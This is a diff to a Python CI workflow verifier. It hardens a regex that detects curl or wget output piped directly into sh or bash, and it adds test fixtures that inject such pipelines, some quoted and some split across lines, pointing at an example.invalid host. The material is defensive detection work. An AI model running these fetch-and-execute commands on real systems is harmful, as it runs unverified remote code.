@@ -6215,10 +6215,14 @@ def _workflow_checkout_sha_consistency_invalid(workflow: str, relative_path: str
 
 def _workflow_fetched_output_shell_pipeline_invalid(workflow: str) -> bool:
     literal_path = r"/?(?:[A-Za-z0-9_.+-]+/)*"
+    source_path = rf"{literal_path}(?:curl|wget)"
+    sink_path = rf"{literal_path}(?:sh|bash)"
+    token_end = r"(?=$|[\s;&|(){}])"
+    source_token = rf"(?:{source_path}|\"{source_path}\"|'{source_path}'){token_end}"
+    sink_token = rf"(?:{sink_path}|\"{sink_path}\"|'{sink_path}'){token_end}"
     direct_pipeline = re.compile(
         rf"(?:^|[\s;&|(){{}}])(?:command[ \t]+(?:--[ \t]+)?)?"
-        rf"{literal_path}(?:curl|wget)(?![A-Za-z0-9_.+-])"
-        rf"[^\n|;&]*\|[ \t]*{literal_path}(?:sh|bash)(?![A-Za-z0-9_.+-])",
+        rf"{source_token}[^\n|;&]*\|[ \t\r\n]*{sink_token}",
         re.MULTILINE,
     )
     for scalar in _workflow_run_scalars(workflow):
@@ -6903,6 +6907,20 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
                 "        run: |\n"
                 "          set -euo pipefail\n"
                 "          command curl --fail https://example.invalid/bootstrap | /usr/bin/bash\n",
+                1,
+            ),
+            "python CI run scalars must not pipe curl or wget output directly to sh or bash",
+        ),
+        (
+            "quoted command-dash-prefixed network fetch piped to quoted shell",
+            workflow.replace(
+                "      - name: Run python tool self-tests and lock validation\n"
+                "        run: |\n"
+                "          set -euo pipefail\n",
+                "      - name: Run python tool self-tests and lock validation\n"
+                "        run: |\n"
+                "          set -euo pipefail\n"
+                '          command -- "/usr/bin/curl" https://example.invalid/bootstrap | "/bin/sh"\n',
                 1,
             ),
             "python CI run scalars must not pipe curl or wget output directly to sh or bash",
@@ -7811,6 +7829,26 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
             "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
         ),
         changed(
+            "network-fetch-pipe-newline-to-shell",
+            "      - name: Run runtime and evidence gates\n"
+            "        env:\n"
+            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
+            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
+            "          CONTAINER_ENGINE: docker\n"
+            "        run: |\n"
+            "          set -euo pipefail\n",
+            "      - name: Run runtime and evidence gates\n"
+            "        env:\n"
+            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
+            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
+            "          CONTAINER_ENGINE: docker\n"
+            "        run: |\n"
+            "          set -euo pipefail\n"
+            "          /usr/bin/wget -qO- https://example.invalid/bootstrap |\n"
+            "            /bin/sh\n",
+            "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
+        ),
+        changed(
             "buildkit-host-network",
             "            network=host\n",
             "            network=bridge\n",
@@ -7866,11 +7904,12 @@ def check_publish_python_workflow_self_test(only_label: str | None = None) -> No
         require(parse_error is None, f"publish Python workflow mutation is not valid YAML [{label}]: {parse_error}")
         mutated_bytes = mutated.encode()
         errors = publish_python_workflow_errors(mutated)
-        if not errors:
+        lock_fallback_used = not errors
+        if lock_fallback_used:
             errors.extend(publish_python_surface_lock_errors(mutated_bytes))
         if expected not in errors:
             raise VerifyError(f"publish Python workflow mutation unexpectedly passed: {label}")
-        if label == "surface-digest-fallback":
+        if lock_fallback_used:
             require(errors == [expected], f"publish Python surface fixture returned an unexpected error set: {errors}")
         print(f"publish Python workflow mutation rejected [{label}] parse=ok diagnostic={expected}")
     if only_label is None:
